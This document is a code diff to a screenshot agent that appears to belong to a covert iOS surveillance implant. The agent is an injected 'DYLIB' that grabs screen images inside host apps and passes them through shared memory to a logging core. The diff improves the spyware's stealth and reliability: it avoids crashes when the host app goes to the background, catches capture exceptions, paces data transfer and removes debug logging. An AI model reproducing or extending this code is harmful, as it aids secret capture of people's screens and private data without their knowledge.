@@ -14,6 +14,9 @@
 #import "RCSISharedMemory.h"
 #import "RCSICommon.h"
 
+#define APP_IN_BACKGROUND 0
+#define APP_IN_FOREGROUND 1
+
 typedef struct _screenshot {
   u_int sleepTime;
   u_int dwTag;
@@ -87,6 +90,9 @@ extern RCSISharedMemory           *mSharedMemoryLogging;
    
   NSString *execName = [[NSBundle mainBundle] bundleIdentifier];
 
+  if (mContextHasBeenSwitched == APP_IN_BACKGROUND)
+    return FALSE;
+    
   // Fix for iOS: background apps will crash if 
   // trying to grab a shot
   UIApplication *uiApp = [UIApplication sharedApplication];
@@ -117,9 +123,18 @@ extern RCSISharedMemory           *mSharedMemoryLogging;
       return NO;
     }
   
-  // Run the screenshot
-  screenShot = UIGetScreenImage();
-  
+  // try grabbing: if app is going in bg catch exception
+  @try {
+    // Run the screenshot
+    screenShot = UIGetScreenImage();
+  }  
+  @catch (NSException *e) {
+#ifdef DEBUG
+    NSLog(@"%s: exception throw by UIGetScreenImage: %@", __FUNCTION__, e);
+#endif
+    return FALSE;
+  }
+   
   if (screenShot == NULL)
     {
 #ifdef DEBUG
@@ -136,6 +151,8 @@ extern RCSISharedMemory           *mSharedMemoryLogging;
 
     UIImage *imgScr = [UIImage imageWithCGImage: screenShot];
   
+    CGImageRelease(screenShot);
+    
   if (imgScr == nil)
     {
 #ifdef DEBUG
@@ -220,7 +237,7 @@ extern RCSISharedMemory           *mSharedMemoryLogging;
   
   shMemoryHeader->status          = SHMEM_WRITTEN;
   shMemoryHeader->logID           = logID;
-  shMemoryHeader->agentID         = AGENT_SCREENSHOT;
+  shMemoryHeader->agentID         = LOG_SNAPSHOT;
   shMemoryHeader->direction       = D_TO_CORE;
   shMemoryHeader->commandType     = CM_CREATE_LOG_HEADER;
   shMemoryHeader->flag            = 0;
@@ -286,7 +303,7 @@ extern RCSISharedMemory           *mSharedMemoryLogging;
       
       shMemoryHeader->status          = SHMEM_WRITTEN;
       shMemoryHeader->logID           = logID;
-      shMemoryHeader->agentID         = AGENT_SCREENSHOT;
+      shMemoryHeader->agentID         = LOG_SNAPSHOT;
       shMemoryHeader->direction       = D_TO_CORE;
       shMemoryHeader->flag            = 0;
       shMemoryHeader->commandDataSize = leftBytesLength;    
@@ -307,6 +324,9 @@ extern RCSISharedMemory           *mSharedMemoryLogging;
 #endif
         }
     
+      // timing for producer/consumer
+      usleep(250000);
+      
       [logData release];
     
     } while (byteIndex < [entryData length]);
@@ -321,6 +341,8 @@ extern RCSISharedMemory           *mSharedMemoryLogging;
 @end
 
 @implementation RCSIAgentScreenshot
+
+@synthesize mContextHasBeenSwitched;
 
 #pragma mark -
 #pragma mark Class and init methods
@@ -396,36 +418,26 @@ extern RCSISharedMemory           *mSharedMemoryLogging;
   int  grabCounter;
   
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
-
-#ifdef DEBUG
-  NSLog(@"[DYLIB] %s: Agent screenshot started", __FUNCTION__);
-#endif
   
   [mAgentConfiguration setObject: AGENT_RUNNING forKey: @"status"];
   
-#ifdef DEBUG
-  NSLog(@"[DYLIB] %s AgentConf: %@", __FUNCTION__, mAgentConfiguration);
-#endif
+  // enable _grabScreenshot
+  mContextHasBeenSwitched = APP_IN_FOREGROUND;
   
   screenshotAgentStruct *screenshotRawData;
   screenshotRawData = (screenshotAgentStruct *)[[mAgentConfiguration objectForKey: @"data"] bytes];
   
   int sleepTime = screenshotRawData->sleepTime/1000;
   grabCounter   = sleepTime;
-  
-#ifdef DEBUG
-  NSLog(@"[DYLIB] %s: Screenshot Agent grab image every %d sec.", __FUNCTION__, sleepTime);
-#endif
-  
+
+  // wait for NSView rendering...
   usleep(1500000);
   
   while ([mAgentConfiguration objectForKey: @"status"] != AGENT_STOP &&
          [mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED)
     {
       NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
-    
-      //[[NSRunLoop currentRunLoop] runUntilDate: [NSDate dateWithTimeIntervalSinceNow: SCR_WAIT]];
-      
+
       // fix for iOS4
       sleep(SCR_WAIT);
     
@@ -449,10 +461,6 @@ extern RCSISharedMemory           *mSharedMemoryLogging;
         {
           grabCounter++;
         }
-
-#ifdef DEBUG
-    NSLog(@"[DYLIB] %s: innerPool release", __FUNCTION__);
-#endif
 
       [innerPool release];
     }
